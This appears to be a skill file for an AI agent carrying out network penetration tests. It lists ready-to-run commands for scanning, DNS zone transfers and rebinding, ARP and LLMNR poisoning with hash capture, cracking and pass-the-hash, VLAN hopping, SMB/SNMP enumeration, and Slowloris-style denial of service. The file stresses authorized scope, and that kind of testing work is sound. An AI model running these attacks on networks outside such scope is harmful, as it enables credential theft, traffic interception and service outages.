---
name: infrastructure_network
description: Network infrastructure testing - port scanning, DNS attacks, ARP/DNS MITM, VLAN hopping, SMB enumeration, sniffing, DoS assessment
---

# Infrastructure & Network Security

Network infrastructure testing covers the attack surface below the application layer: open ports, misconfigured services, DNS weaknesses, and network-level attack vectors. Always confirm scope and authorization before active network scanning.

## Phase 1: Host Discovery & Port Scanning

### Fast Sweep

```bash
# Ping sweep (ICMP + ARP)
nmap -sn 192.168.1.0/24 -oA hosts_sweep
arp-scan --localnet

# Fast TCP scan (top 1000 ports)
nmap -sS -T4 --open -oA fast_scan 192.168.1.0/24

# Full port scan
nmap -sS -p- -T4 --open TARGET_IP -oA full_ports

# UDP top ports
nmap -sU --top-ports 100 TARGET_IP -oA udp_scan

# Service version detection + default scripts
nmap -sV -sC -p PORTS TARGET_IP -oA service_scan
```

### Masscan (High Speed)

```bash
masscan -p1-65535 192.168.1.0/24 --rate=10000 -oG masscan.out
# Parse output:
grep "Host:" masscan.out | awk '{print $2}' | sort -u
```

### Service-Specific Nmap Scripts

```bash
# SMB
nmap --script smb-vuln-* -p 445 TARGET_IP
nmap --script smb-enum-shares,smb-enum-users -p 445 TARGET_IP

# HTTP
nmap --script http-methods,http-title,http-headers -p 80,443,8080 TARGET_IP

# FTP
nmap --script ftp-anon,ftp-brute -p 21 TARGET_IP

# SSL/TLS
nmap --script ssl-enum-ciphers,ssl-cert -p 443 TARGET_IP
testssl.sh TARGET_IP:443

# DNS
nmap --script dns-brute -p 53 TARGET_IP

# SNMP
nmap -sU -p 161 --script snmp-info TARGET_IP
```

## Phase 2: DNS Attacks

### Zone Transfer

```bash
# Attempt AXFR (zone transfer)
dig @DNS_SERVER_IP domain.com AXFR
host -t axfr domain.com DNS_SERVER_IP
nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=target.com -p 53 TARGET_IP

# Success: dumps all DNS records — reveals internal hostnames, IPs, subdomains
```

### DNS Cache Poisoning (Kaminsky Attack)

```bash
# Check if resolver is vulnerable to birthday attack
# Requires: source port randomization disabled OR predictable transaction IDs
# Safe detection: check DNS server version, query source port variance
dig @TARGET_DNS +short porttest.dns-oarc.net TXT
# "GREAT" = source port randomized (safer)
# "POOR" = limited randomization (vulnerable)
```

### DNS Rebinding

```
# DNS rebinding bypasses Same-Origin Policy for internal services:
1. Attacker controls evil.com DNS
2. Initial lookup: evil.com → 1.2.3.4 (attacker's server, short TTL)
3. Browser makes XHR to evil.com
4. TTL expires → DNS rebinds: evil.com → 192.168.1.1 (internal target)
5. Browser XHR now hits internal target with valid Same-Origin context

# Tools: singularity (DNS rebinding framework)
# Detection: DNS server should not resolve internal IPs for external domains
```

### DNS Subdomain Enumeration

```bash
# Zone transfer first, then brute force
dnsenum --dnsserver 8.8.8.8 --enum target.com -f /usr/share/wordlists/subdomains.txt
dnsrecon -d target.com -t brt -D /usr/share/wordlists/subdomains.txt
```

## Phase 3: Network MITM

### ARP Spoofing

```bash
# ARP poisoning: tell gateway "victim is me" and tell victim "gateway is me"
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP &
arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP &
echo 1 > /proc/sys/net/ipv4/ip_forward    # enable forwarding

# Capture credentials with mitmproxy
mitmproxy --mode transparent -p 8080
# Or with SSLstrip for HTTPS downgrade:
mitmproxy --mode transparent --ssl-insecure -p 8080
```

### LLMNR / NBT-NS Poisoning (Windows Networks)

```bash
# Responder — captures NetNTLM hashes when Windows tries to resolve local names
# Run in a network with Windows clients making name resolution requests
responder -I eth0 -rdw

# Captured hashes appear in Responder.db
# Crack with hashcat:
hashcat -m 5600 netntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Pass captured hash:
crackmapexec smb TARGET_IP -u user -H NTLM_HASH
```

## Phase 4: VLAN Hopping

```bash
# Double-tagging attack (switch must be on native VLAN 1)
# Frame with two 802.1Q headers: outer=native, inner=target VLAN
# When outer stripped by first switch, inner VLAN tag routes to target VLAN

# DTP trunk negotiation abuse (if DTP not disabled):
msfconsole -x "use auxiliary/scanner/snmp/snmp_login; set RHOSTS TARGET_IP; run"
# Enumerate switch configs to find trunk ports / DTP

# Yersinia for DTP/spanning tree attacks:
yersinia -I    # interactive mode → DTP attacks
```

## Phase 5: SMB Enumeration

```bash
# Null session enumeration
enum4linux-ng -A TARGET_IP -u "" -p ""

# CrackMapExec (comprehensive)
crackmapexec smb TARGET_IP --shares
crackmapexec smb TARGET_IP --users
crackmapexec smb TARGET_IP --groups
crackmapexec smb TARGET_IP --pass-pol    # password policy

# smbmap — share permissions
smbmap -H TARGET_IP -u "" -p ""
smbmap -H TARGET_IP -u guest -p ""

# Manual share exploration
smbclient -L //TARGET_IP -N    # list shares
smbclient //TARGET_IP/SHARE -N # connect to share

# Check for EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 TARGET_IP
```

## Phase 6: SNMP Enumeration

```bash
# SNMP v1/v2 with default community strings
snmp-check TARGET_IP -c public
snmpwalk -v2c -c public TARGET_IP 1.3.6.1
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt TARGET_IP

# Interesting OIDs:
# 1.3.6.1.2.1.25.4.2.1.2 — running processes
# 1.3.6.1.2.1.25.6.3.1.2 — installed software
# 1.3.6.1.2.1.6.13.1.3 — open TCP ports
# 1.3.6.1.2.1.4.20.1.1 — network interfaces
```

## DoS Assessment

```bash
# Only assess against authorized targets in scope
# Slow HTTP attacks (Slowloris):
slowloris TARGET_IP -p 80 -s 1000 --sleeptime 15

# SSL exhaustion (resource check):
thc-ssl-dos TARGET_IP 443 --accept

# Check rate limiting on authentication:
# Send 1000 login requests — confirm lockout or rate limit kicks in
```

## Validation Approach

1. Port scan with nmap first — capture all open services
2. Service fingerprint each interesting port
3. DNS: attempt zone transfer before brute force
4. SMB: null session → shares → user enum → check EternalBlue
5. Document every finding: port/service → proof of access/vulnerability → impact
6. Network-level scans: always record IP scope, scan time, tool used for audit trail

## Tools

- `nmap` — port scanning + service detection
- `masscan` — high-speed port sweep
- `responder` — LLMNR/NBT-NS poisoning
- `enum4linux-ng` — SMB/LDAP enumeration
- `dnsrecon` / `dnsenum` — DNS enumeration
- `CrackMapExec` / `NetExec` — network protocol testing
- `arpspoof` / `bettercap` — ARP poisoning
